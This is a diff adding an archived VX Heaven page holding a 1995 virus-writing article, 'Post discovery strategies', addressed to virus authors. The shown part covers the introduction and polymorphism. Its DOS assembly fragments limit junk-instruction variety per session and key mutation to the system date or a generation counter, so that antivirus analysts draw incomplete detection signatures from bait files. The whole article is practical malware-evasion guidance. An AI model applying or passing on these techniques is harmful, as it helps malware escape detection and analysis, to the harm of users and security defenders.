@@ -1,0 +1,797 @@
+<?xml version="1.0"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<head>
+<title> Sepultura 'Post discovery strategies' (VX heaven)</title>
+<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
+<meta name="Author" content="Sepultura"/>
+<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, Sepultura,Post discovery strategies, bait, file, debug, offset, routines, month, instruction, debugger, stamp, anti, files, date, generation, decrypt, interrupt"/>
+<meta name="Description" content="Most virii these days, take many Pre-Discovery precautions. This simply means that they take precautions to avoid discovery, assuming the virus has not already been discovered. Common examples of Pre-Discovery Stratagies are File Stealth, Sector Stealth, and MCB stealth (i.e any stealth). These mechanisms are used to stop the virus being discovered, but once it has been discovered, and is in the hands of the AV, they're essentially useless. It is only a matter of days (or even hours) until a suitable scan string or algorithm has been determined, for inclusion in to there AV programs.There is how ever, a solution: post discovery strategies. These are mechanisms that instead of serving the purpose of hiding the virus from detection, make the virus harder to analyse, and hence determine a scan string or detection algorithm. To be entirely honest, the previous statement is not completely correct - in order to take advantage of any of these methods your virus can not have a scan string - without atleast polymorphism, Post Discovery Stratagies are useless. This document will be divided in to three main sections: Polymorphis, Anti-Bait Techniques, Anti-Debugger Techniques."/>
+<script type="text/javascript">
+//<![CDATA[
+try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"d8b2509f4d148520e696830715cf99ff3ad25f58-1498756994-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
+//]]>
+</script>
+<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
+<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
+<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/vse00.html"/>
+<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
+</head>
+<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
+<div class="s1">
+<div style="float:right;"><a href="/lib/index.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
+<div style="float: right;"><div id="plusone"></div></div>
+<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
+<div style="float: right;" class="addthis_toolbox addthis_default_style">
+<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
+<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
+<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
+</div>
+<div style="float: right;">
+<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
+<form action="/search.php" id="cse-search-box">
+<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
+<input type="hidden" name="cof" value="FORID:10"/>
+<input type="hidden" name="ie" value="UTF-8"/>
+<input type="text" name="q" size="12" value=" "/>
+<input type="submit" name="sa" value="Search"/>
+</form>
+</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
+<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
+</div>
+<div class="s2"><h1>Post discovery strategies</h1><p><a href="/lib/?lang=en&amp;author=Sepultura"> Sepultura</a><br/> <em><a href="/vx.php?fid=273#f273">Insane Reality Magazine [7]</a></em><br/> <em>December 1995</em></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/vse00.html';</script><div class="ci"><a href="/lib/?ci=vse00">1</a></div>[<a style="" href="/lib/?lang=EN&amp;index=DO#vse00">Back to index</a>] [<a href="/lib/vse00.html#disqus_thread">Comments</a>]<br/> 
+<ul>
+<li><a href="#c0">Introduction</a></li>
+<li><a href="#c1">Polymorphism</a>
+<ul>
+<li><a href="#c11">The Obvious</a></li>
+<li><a href="#c12">Slow Mutation</a></li>
+<li><a href="#c13">Make No Two Conditions Dependant</a></li>
+</ul></li>
+<li><a href="#c2">Anti-Bait Technique</a>
+<ul>
+<li><a href="#c21">The Obvious</a></li>
+<li><a href="#c22">Avoid Digital File Names</a></li>
+<li><a href="#c23">Avoid Consecutive File Names</a></li>
+</ul></li>
+<li><a href="#c3">Anti-Debugger Techniques</a>
+<ul>
+<li><a href="#c31">The Obvious</a></li>
+<li><a href="#c32">Interrupt Replacement</a></li>
+<li><a href="#c33">INT 1 Tracing Destroys the Stack</a></li>
+<li><a href="#c34">Use Your Anti-Debug Routines as The Decrypt Key</a></li>
+<li><a href="#c35">The Running Line</a></li>
+</ul></li>
+<li><a href="#c4">Conclusion</a></li>
+<li><a href="#c5">Bye-bye</a></li>
+</ul>
+<p><em>Use anarchy to get what you want</em></p>
+<h2><a name="c0"></a>Introduction</h2>
+<p>Most virii these days, take many Pre-Discovery precautions. This simply means that they take precautions to avoid discovery, assuming the virus has not already been discovered. Common examples of Pre-Discovery Stratagies are File Stealth, Sector Stealth, and MCB stealth (i.e any stealth). These mechanisms are used to stop the virus being discovered, but once it has been discovered, and is in the hands of the AV, they're essentially useless. It is only a matter of days (or even hours) until a suitable scan string or algorithm has been determined, for inclusion in to there AV programs.</p>
+<p>There is how ever, a solution: <strong>post discovery strategies</strong>. These are mechanisms that instead of serving the purpose of hiding the virus from detection, make the virus harder to analyse, and hence determine a scan string or detection algorithm. To be entirely honest, the previous statement is not completely correct - in order to take advantage of any of these methods your virus can not have a scan string - without atleast polymorphism, Post Discovery Stratagies <strong>are useless</strong>. This document will be divided in to three main sections:</p>
+<ul>
+<li>Polymorphism</li>
+<li>Anti-Bait Techniques</li>
+<li>Anti-Debugger Techniques.</li>
+</ul>
+<p>I have decided to do it in that particular order, as it follows my master scheme, which in my opinion takes maximum advantage of Post Discovery Stratagies, and which I will outline throughout this document.</p>
+<p>I have supplied example code fragments throughout this document, several full programs in the Anti - Debugger section, as well as a bait maker in the Anti-Bait section, so you can test your Anti-Bait routines.</p>
+<h2><a name="c1"></a>Polymorphism</h2>
+<p><em>I used the enemy I used anarchy</em></p>
+<p>This section is not intended to tell you what a polymorphic engine is, nor will it tell you how to code one. If you do not know either of these, you should read this when you do, or alternatively you could read this, and take the explained methods in to account when you do code one.</p>
+<p>The thing you have to remember is that the AV people need to devise an alogrithm that will detect near to 100% of their samples, but at the same time, have only a small number of false positives. Your job, is ofcourse, to stop them from doing this.</p>
+<h3><a name="c11"></a>The Obvious</h3>
+<p>One of the most obvious things that would you help in your Post Discovery Stratagies, is to make the decryptors and junk as varied as is possible. This way, they cannot use an algorithm that traces through the code, and concludes that the file is not infected, as soon as an opcode is encounted that can't be generated by your engine. What might not seem to obvious, is that although your engine should be able to CREATE a wide variety of junk instructions, it should not USE a wide variety of junk instructions in each decryptor. This might seem strange, but it can be very useful in delaying the AV's efforts. This is because there are two methods that the AV will use to analyse your engine:</p>
+<ol>
+<li>They will disassemble the virus and analyse the engine, to see what it can generate in all possible cases.</li>
+<li>They will infect 10s of thousands of bait files to see what it generates in all possible cases.</li>
+</ol>
+<p>The first of these can be countered by keeping the actual engine encrypted, independently of the virus, and then keeping the decryptor protected - using the methods outlined in Section 3 (Anti - Debugger Techniques).</p>
+<p>The second method can be countered using the techniques that will be discussed in this section (Polymorphism), and Section 2 (Anti - Bait Techniques).</p>
+<p>By using only a very small variety of the large number of junk instructions that your engine can generate, when the AV people look at the sample bait files, they will only see a small selection of the junk that your virus can really create. Because your polymorphic engine is so heavily encrypted / armoured, they will not have time to disassemble it, and will have to make their judgements based on the bait files. However, since the decryptors will only have a limited selection of all possible cases, they could easilly make the mistake of basing their algorithm on just those decryptors, and release an incomplete algorithm. Of course they will not realise their mistake until it is to late. Let us look at the following code as an example:</p>
+<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: black; font-style: italic;">;Please note that this is simply a code fragment. junk? are supposed to </span><br/>
+<span style="color: black; font-style: italic;">;be sub-procedures that create different junk opcodes, while get_rand is </span><br/>
+<span style="color: black; font-style: italic;">;supposed to be a sub-procedure that returns a random number in AX </span><br/>
+<span style="color: black; font-style: italic;">;between 0 and AX. It is assumed that ES = DS = CS.</span><br/>
+<br/>
+choose_junk_routines<span style="color: #339933;">:</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">5</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;This code should be run only once, </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0Ah</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;when the virus installs it self TSR. </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; get_rand&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;It will select 5 out of 15 junk </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;routines to call for the decryptors. </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xchg</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">si</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Because it is only run once, all </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">si</span><span style="color: #339933;">,</span>offset main_junk_tbl <span style="color: black; font-style: italic;">;decryptors will only use those junk </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">di</span><span style="color: #339933;">,</span>offset junk_tbl&nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;routines 'til the system is rebooted </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">rep</span> &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">movsw</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;and the virus re-installed. </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">...</span><br/>
+<br/>
+main_junk_tbl<span style="color: #339933;">:</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;This is a table, listing all </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dw</span>&nbsp; &nbsp; &nbsp; offset junk0&nbsp; &nbsp; <span style="color: black; font-style: italic;">;possible junk routines. </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dw</span>&nbsp; &nbsp; &nbsp; offset junk1<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dw</span>&nbsp; &nbsp; &nbsp; offset junk2<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dw</span>&nbsp; &nbsp; &nbsp; offset junk3<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dw</span>&nbsp; &nbsp; &nbsp; offset junk4<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dw</span>&nbsp; &nbsp; &nbsp; offset junk5<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dw</span>&nbsp; &nbsp; &nbsp; offset junk6<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dw</span>&nbsp; &nbsp; &nbsp; offset junk7<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dw</span>&nbsp; &nbsp; &nbsp; offset junk8<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dw</span>&nbsp; &nbsp; &nbsp; offset junk9<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dw</span>&nbsp; &nbsp; &nbsp; offset junkA<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dw</span>&nbsp; &nbsp; &nbsp; offset junkB<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dw</span>&nbsp; &nbsp; &nbsp; offset junkC<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dw</span>&nbsp; &nbsp; &nbsp; offset junkD<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dw</span>&nbsp; &nbsp; &nbsp; offset junkE<br/>
+<br/>
+junk_tbl<span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;This is a table, to store the 5 junk </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dw</span>&nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">0</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span> &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;routines to actually be used. </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">...</span><br/>
+<br/>
+put_junk<span style="color: #339933;">:</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">4</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;This routine when, called will </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; get_rand&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;generate 1 junk instruction. </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;It will call 1 of the 5 routines </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xchg</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">si</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;stored in junk_tbl. </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lodsw</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br/>
+&nbsp;</div>
+<p>The above code fragment, will ensure that all files infected in any 1 session, will only use 5 out of the 15 possible junk instructions.</p>
+<h3><a name="c12"></a>Slow Mutation</h3>
+<p>The above techniques work well, but can be even more effective, when used in conjucntion with slow mutation. Slow Mutation basically means that instead of making certain descisions based on random numbers, you make the descisions based on relatively static values. The most common values used for this, are from the date (i.e. the month or day of the month). For example, let us imagine that the sub - procedure 'choose_junk_routines' in the previous example, was replaced with this:</p>
+<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">choose_junk_routines<span style="color: #339933;">:</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span>2a &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;ah=2a/i21 (get system date) </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">21</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dl</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xchg</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dh</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">dl</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xchg</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cwd</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;ax=month, dx=0</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">6</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">div</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;divide month by 6 </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xchg</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;ax = remainder (i.e. 0 - 5) </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xchg</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">si</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">si</span><span style="color: #339933;">,</span>offset main_junk_tbl<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">di</span><span style="color: #339933;">,</span>offset junk_tbl<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">5</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">rep</span> &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">movsw</span><br/>
+&nbsp;</div>
+<p>The advantage of using this method, is that the same set of five junk routines will be used for a <strong>entire month</strong>. With the previous example if the AV was to make some bait files, and look at them, and think that your virus only generated five different junk instructions, and then ran the bait maker again, another time, after resetting the system, he/she would get bait file with (probably) a different set of junk instructions in the decryptor. Because of this, he/she would probably catch on. This is important to note, because they will have to make a set of bait files to devise the algorithm, and then at least another set to test it. If you based the 5 instructions on the month, and armoured the choose_junk_ routines procedure, then they would get the same 5 instructions, because they would be all produced in the same month, and would not easily catch on. Other things you should base upon slow mutation techniques include things such as what registers to use, the looping method, the encrypt/decrypt method, and the length of the decryptor. This way, they have to reboot the computer each time, and set a new date, to see all possible combinations. Consisdering there are thousands of bait file to be made, this also means that there are thousands of resets to be done!</p>
+<p>Another thing you could base slow mutation descisions on, is a generation counter. This is very effective, because if the AV runs an infected file, and then because the virus is TSR in memory, runs the bait creator, to create some infected samples, all the infected samples, will be of the same generation. Even if the AV people think of changing the date, the fact that the virus changes some aspects of itself on each generation, will not be so obvious. This is especially true if the virus makes the changes on, say every fourth generation, instead of each and every generation. For example:</p>
+<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">inc</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cs</span><span style="color: #339933;">:</span><span style="color: #0000ff; font-weight: bold;">word</span> ptr generation&nbsp; <span style="color: black; font-style: italic;">;This should be run once, </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;at installation.</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">...</span><br/>
+<br/>
+<span style="color: black; font-style: italic;">;This sub-procedure will choose what method to use to decrement the </span><br/>
+<span style="color: black; font-style: italic;">;count register. It will choose one of the 8 possible procedures to </span><br/>
+<span style="color: black; font-style: italic;">;call from the &quot;decrement_tbl&quot; table. Instead of choosing a method at </span><br/>
+<span style="color: black; font-style: italic;">;random, it divdes the generation by 8, and then takes the modulos of </span><br/>
+<span style="color: black; font-style: italic;">;(GENERATION / 8) / 8, to choose which procedure to use. In short, the </span><br/>
+<span style="color: black; font-style: italic;">;decrement method will only change every 8th generation. The AV do not </span><br/>
+<span style="color: black; font-style: italic;">;spend enough time to see all possible methods, as they would have to </span><br/>
+<span style="color: black; font-style: italic;">;look at 64 different generations. They will most likely look at only </span><br/>
+<span style="color: black; font-style: italic;">;one or two.</span><br/>
+<br/>
+choose_decrement_method<span style="color: #339933;">:</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><br/>
+<br/>
+generation&nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">equ</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">$</span><span style="color: #339933;">-</span><span style="color: #ff0000;">2</span> &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Generation counter starts at 0 </span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">shr</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">3</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;Divide Generation count by 8 </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">and</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">7</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;get number between 0 and 7 </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xchg</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">si</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">si</span><span style="color: #339933;">,</span>offset decrement_tbl<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lodsw</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">...</span><br/>
+<br/>
+decrement_tbl<span style="color: #339933;">:</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;this is supposed to be a table of </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dw</span>&nbsp; &nbsp; &nbsp; offset code_dec_reg &nbsp; &nbsp; <span style="color: black; font-style: italic;">;all the possible procedures you can </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dw</span>&nbsp; &nbsp; &nbsp; offset code_sub_reg_1 &nbsp; <span style="color: black; font-style: italic;">;use to decrement the count register. </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dw</span>&nbsp; &nbsp; &nbsp; offset code_add_reg_negative_1<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dw</span>&nbsp; &nbsp; &nbsp; offset code_clc_sbb_reg_1<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dw</span>&nbsp; &nbsp; &nbsp; offset code_stc_sbb_reg_0<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dw</span>&nbsp; &nbsp; &nbsp; offset code_clc_adc_reg_negative_1<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dw</span>&nbsp; &nbsp; &nbsp; offset code_stc_adc_reg_negative_2<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dw</span>&nbsp; &nbsp; &nbsp; offset code_inc_dec_dec_reg<br/>
+&nbsp;</div>
+<p>Of course, you do not have to base something as trivial as the method of decrement on the generation counter, and could instead base something more important like the actual method of decryption on it.</p>
